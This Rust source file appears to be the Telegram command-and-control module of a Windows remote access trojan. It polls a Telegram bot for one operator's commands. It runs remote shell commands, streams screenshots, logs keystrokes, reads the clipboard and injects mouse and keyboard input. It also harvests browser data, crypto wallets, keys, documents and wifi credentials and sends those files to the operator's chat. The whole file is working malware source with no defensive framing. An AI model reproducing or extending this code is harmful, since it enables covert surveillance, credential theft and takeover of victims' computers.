//! Telegram-only control loop. Replaces the WebSocket C2 when `TG_TOKEN` is
//! set: long-polls `getUpdates`, authorizes one operator chat, and dispatches
//! slash commands to screen capture, shell, harvesting, keylogging, clipboard,
//! and remote input.
#![cfg(windows)]

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::Duration;

use serde_json::Value;

use crate::telegram as tg;

static STREAM: AtomicBool = AtomicBool::new(false);
static STREAM_SECS: AtomicU64 = AtomicU64::new(5);
static STREAM_STARTED: AtomicBool = AtomicBool::new(false);

const HELP: &str = "\
/help — this list
/info — host, user, admin, screen, ip
/screen [quality] [scale] — one screenshot
/stream on|off [secs] — periodic screenshots
/shell <command> — run a command
/harvest [collectors] — env browsers wallets keys documents wifi clipboard
/grab <path>[|<path>] — exfil specific files/dirs
/keylog on|off — keystroke capture
/keys — dump captured keystrokes
/clip — current clipboard
/move <x> <y> — move cursor (pixels)
/click <x> <y> [left|right|middle]
/type <text> — type text
/key <vk> [down|up] — raw virtual key
/exit — stop the agent";

pub async fn run() {
    let _ = tokio::task::spawn_blocking(tg::delete_webhook).await;
    crate::keylog::set_telegram(true);

    // Prime: skip command history, but lock the operator chat from the last
    // message so a stale `/shell` from before launch is never executed.
    let mut offset: i64 = 0;
    if let Ok(Ok(updates)) = tokio::task::spawn_blocking(|| tg::get_updates(-1, 0)).await {
        if let Some(u) = updates.last() {
            if let Some(id) = u.get("update_id").and_then(|x| x.as_i64()) {
                offset = id + 1;
            }
            if let Some(msg) = u.get("message") {
                if let (Some(chat), Some(text)) = (
                    msg.get("chat")
                        .and_then(|c| c.get("id"))
                        .and_then(|x| x.as_i64()),
                    msg.get("text").and_then(|x| x.as_str()),
                ) {
                    let _ = authorized(&chat.to_string(), text);
                }
            }
        }
    }

    loop {
        let res = tokio::task::spawn_blocking(move || tg::get_updates(offset, 25)).await;
        match res {
            Ok(Ok(updates)) => {
                for u in updates {
                    if let Some(id) = u.get("update_id").and_then(|x| x.as_i64()) {
                        if id >= offset {
                            offset = id + 1;
                        }
                    }
                    handle_update(&u);
                }
            }
            Ok(Err(e)) => {
                eprintln!("[tg] poll: {e}");
                tokio::time::sleep(Duration::from_secs(5)).await;
            }
            Err(e) => {
                eprintln!("[tg] join: {e}");
                tokio::time::sleep(Duration::from_secs(5)).await;
            }
        }
    }
}

fn handle_update(u: &Value) {
    let Some(msg) = u.get("message") else {
        return;
    };
    let Some(chat) = msg
        .get("chat")
        .and_then(|c| c.get("id"))
        .and_then(|x| x.as_i64())
    else {
        return;
    };
    let Some(text) = msg.get("text").and_then(|x| x.as_str()) else {
        return;
    };
    let chat_s = chat.to_string();
    if !authorized(&chat_s, text) {
        return;
    }
    let (cmd, arg) = parse(text);
    tokio::spawn(command_task(chat_s, cmd, arg));
}

/// One operator chat only. `TG_CHAT` pins it; otherwise the first chat that
/// presents `TG_SECRET` (or simply the first chatter) is locked in.
fn authorized(chat: &str, text: &str) -> bool {
    if let Some(c) = tg::chat_id() {
        return c == chat;
    }
    if let Some(sec) = tg::secret() {
        if !text.contains(sec) {
            return false;
        }
    }
    tg::lock_chat(chat);
    true
}

fn parse(text: &str) -> (String, String) {
    let t = text.trim();
    let t = t.strip_prefix('/').unwrap_or(t);
    let mut it = t.splitn(2, char::is_whitespace);
    let head = it.next().unwrap_or("");
    let cmd = head.split('@').next().unwrap_or("").to_ascii_lowercase();
    let arg = it.next().unwrap_or("").trim().to_string();
    (cmd, arg)
}

async fn command_task(chat: String, cmd: String, arg: String) {
    match cmd.as_str() {
        "" | "start" => tg_send(&chat, "online\n/help").await,
        "help" => tg_send(&chat, HELP).await,
        "info" => tg_send(&chat, &info_text()).await,
        "screen" => {
            let (q, sc) = screen_args(&arg);
            let c = chat.clone();
            let _ = tokio::task::spawn_blocking(move || {
                if let Some((_w, _h, jpeg)) = crate::capture::grab(q, sc) {
                    let _ = tg::send_photo_bytes(&c, &jpeg, "screen");
                } else {
                    let _ = tg::send_text_to(&c, "capture failed");
                }
            })
            .await;
        }
        "stream" => {
            let on = !arg.to_ascii_lowercase().starts_with("off");
            if on {
                let secs = arg
                    .split_whitespace()
                    .nth(1)
                    .and_then(|x| x.parse::<u64>().ok())
                    .unwrap_or(5)
                    .max(2);
                STREAM_SECS.store(secs, Ordering::Relaxed);
                STREAM.store(true, Ordering::Relaxed);
                ensure_stream();
                tg_send(&chat, &format!("stream on: {secs}s")).await;
            } else {
                STREAM.store(false, Ordering::Relaxed);
                tg_send(&chat, "stream off").await;
            }
        }
        "shell" => {
            if arg.is_empty() {
                tg_send(&chat, "usage: /shell <command>").await;
                return;
            }
            let c = chat.clone();
            let line = arg.clone();
            let _ = tokio::task::spawn_blocking(move || {
                let out = crate::c2::run_shell(&line);
                if out.chars().count() > 3500 {
                    let _ =
                        tg::send_bytes_document(&c, "shell.txt", out.as_bytes(), "shell output");
                } else {
                    let _ = tg::send_text_to(&c, if out.is_empty() { "(no output)" } else { &out });
                }
            })
            .await;
        }
        "harvest" => {
            let c = chat.clone();
            let which = arg.clone();
            let _ = tokio::task::spawn_blocking(move || {
                let pairs = crate::harvest::collect_selected(&which);
                match tg::exfil_to(&c, &pairs) {
                    Ok(n) => {
                        let _ = tg::send_text_to(&c, &n);
                    }
                    Err(e) => {
                        let _ = tg::send_text_to(&c, &format!("harvest failed: {e}"));
                    }
                }
            })
            .await;
        }
        "grab" => {
            if arg.is_empty() {
                tg_send(&chat, "usage: /grab <path>[|<path>]").await;
                return;
            }
            let c = chat.clone();
            let paths: Vec<String> = arg
                .split('|')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect();
            let _ = tokio::task::spawn_blocking(move || {
                let pairs = crate::harvest::collect_paths(&paths);
                match tg::exfil_to(&c, &pairs) {
                    Ok(n) => {
                        let _ = tg::send_text_to(&c, &n);
                    }
                    Err(e) => {
                        let _ = tg::send_text_to(&c, &format!("grab failed: {e}"));
                    }
                }
            })
            .await;
        }
        "keylog" => {
            let on = arg.to_ascii_lowercase().starts_with("on");
            crate::keylog::set_enabled(on);
            tg_send(&chat, if on { "keylog on" } else { "keylog off" }).await;
        }
        "keys" => {
            let text = crate::keylog::drain();
            if text.is_empty() {
                tg_send(&chat, "(keylog empty)").await;
            } else if text.chars().count() > 3500 {
                let c = chat.clone();
                let _ = tokio::task::spawn_blocking(move || {
                    let _ = tg::send_bytes_document(&c, "keys.txt", text.as_bytes(), "keys");
                })
                .await;
            } else {
                tg_send(&chat, &text).await;
            }
        }
        "clip" => match crate::harvest::clipboard_text() {
            Some(t) if !t.is_empty() => {
                if t.chars().count() > 3500 {
                    let c = chat.clone();
                    let _ = tokio::task::spawn_blocking(move || {
                        let _ =
                            tg::send_bytes_document(&c, "clipboard.txt", t.as_bytes(), "clipboard");
                    })
                    .await;
                } else {
                    tg_send(&chat, &t).await;
                }
            }
            _ => tg_send(&chat, "(clipboard empty)").await,
        },
        "move" => {
            if let Some((x, y)) = xy(&arg) {
                let (sw, sh) = screen();
                crate::input::mouse(x, y, "", "move", sw, sh);
            }
        }
        "click" => {
            if let Some((x, y)) = xy(&arg) {
                let btn = arg.split_whitespace().nth(2).unwrap_or("left");
                let (sw, sh) = screen();
                crate::input::mouse(x, y, btn, "down", sw, sh);
                crate::input::mouse(x, y, btn, "up", sw, sh);
            }
        }
        "type" => {
            crate::input::text(&arg);
        }
        "key" => {
            let mut it = arg.split_whitespace();
            let vk = it
                .next()
                .and_then(|x| x.parse::<u16>().ok())
                .unwrap_or(0);
            let down = !matches!(it.next(), Some("up") | Some("0"));
            crate::input::key(vk, down);
        }
        "exit" => std::process::exit(0),
        _ => tg_send(&chat, &format!("unknown: /{cmd}")).await,
    }
}

async fn tg_send(chat: &str, text: &str) {
    let c = chat.to_string();
    let t = text.to_string();
    let _ = tokio::task::spawn_blocking(move || {
        let _ = tg::send_text_to(&c, &t);
    })
    .await;
}

fn ensure_stream() {
    if STREAM_STARTED.swap(true, Ordering::SeqCst) {
        return;
    }
    tokio::spawn(async move {
        loop {
            let secs = STREAM_SECS.load(Ordering::Relaxed).max(2);
            tokio::time::sleep(Duration::from_secs(secs)).await;
            if !STREAM.load(Ordering::Relaxed) {
                continue;
            }
            let Some(chat) = tg::chat_id() else { continue };
            let _ = tokio::task::spawn_blocking(move || {
                if let Some((_w, _h, jpeg)) = crate::capture::grab(45, 0.5) {
                    let _ = tg::send_photo_bytes(&chat, &jpeg, "screen");
                }
            })
            .await;
        }
    });
}

fn info_text() -> String {
    let (w, h) = crate::capture::screen_size();
    format!(
        "host: {}\nuser: {}\nos: {}\nadmin: {}\nscreen: {w}x{h}\nip: {}\npid: {}",
        crate::c2::hostname(),
        crate::c2::username(),
        crate::c2::os_label(),
        crate::c2::is_admin(),
        local_ip(),
        std::process::id()
    )
}

fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| {
            s.connect("8.8.8.8:80")?;
            s.local_addr()
        })
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|_| "?".into())
}

fn screen() -> (i32, i32) {
    let (w, h) = crate::capture::screen_size();
    (w as i32, h as i32)
}

/// Pixel coordinates from the command -> normalized 0..1 for `input::mouse`.
fn xy(arg: &str) -> Option<(f32, f32)> {
    let mut it = arg.split_whitespace();
    let x: f32 = it.next()?.parse().ok()?;
    let y: f32 = it.next()?.parse().ok()?;
    let (w, h) = screen();
    if w <= 0 || h <= 0 {
        return None;
    }
    Some((
        (x / w as f32).clamp(0.0, 1.0),
        (y / h as f32).clamp(0.0, 1.0),
    ))
}

fn screen_args(arg: &str) -> (u8, f32) {
    let mut it = arg.split_whitespace();
    let q = it
        .next()
        .and_then(|x| x.parse::<u8>().ok())
        .unwrap_or(45)
        .clamp(20, 80);
    let s = it
        .next()
        .and_then(|x| x.parse::<f32>().ok())
        .unwrap_or(0.5)
        .clamp(0.3, 1.0);
    (q, s)
}
